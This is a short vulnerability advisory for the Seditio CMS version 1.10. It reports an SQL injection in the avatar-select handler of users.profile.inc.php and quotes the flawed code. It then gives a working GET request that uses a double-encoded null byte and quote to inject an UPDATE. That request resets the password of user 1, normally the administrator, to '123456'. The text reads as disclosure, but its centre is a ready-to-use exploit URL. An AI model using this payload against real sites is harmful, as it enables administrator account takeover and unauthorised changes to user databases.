Vendor: Neocrome (http://www.neocrome.net)
Version: 1.10 also prior versions must be affected.
About: Via this methods remote attacker can manipulate SQL query and  
change everything in Seditio's user database.Vulnerable code can be  
found in users.profile.inc.php at lines 108-116

-Source in system/core/users/users.profile.inc.php-
108: case 'avatarselect':
109: /* ============= */
110:
111: sed_check_xg();
112: $avatar = $cfg['defav_dir'].urldecode($id);
113: if (file_exists($avatar))
114: { $sql = sed_sql_query("UPDATE $db_users SET  
user_avatar='$avatar' WHERE user_id='".$usr['id']."'"); }
115:
116: break;
-End of source-

As you can see "id" parameter did not sanitized properly and used with  
urldecode() function which decodes id's value so remote attacker can  
bypass magic_quotes_gpc and other functions which escapes ' strings.In  
avatarselect Seditio checks files available with file_exists function  
and urldecode help us by using null byte.
A demostration exploitation will be given in How&Example part.
Level: Highly Critical

How&Example:
GET ->  
http://www.victim.com/users.php?m=profile&a=avatarselect&x=XVALUE&id=default.gif[SQL  
Inject]
GET ->  
http://www.victim.com/users.php?m=profile&a=avatarselect&x=011A99&id=default.gif%2500%2527,user_password=%2527e10adc3949ba59abbe56e057f20f883e%2527/**/where/**/user_id=1/* with this example remote attacker changes password of 1st user of Seditio to  
123456
The XVALUE comes with your avatarselect link it's special to everyuser  
in Seditio.
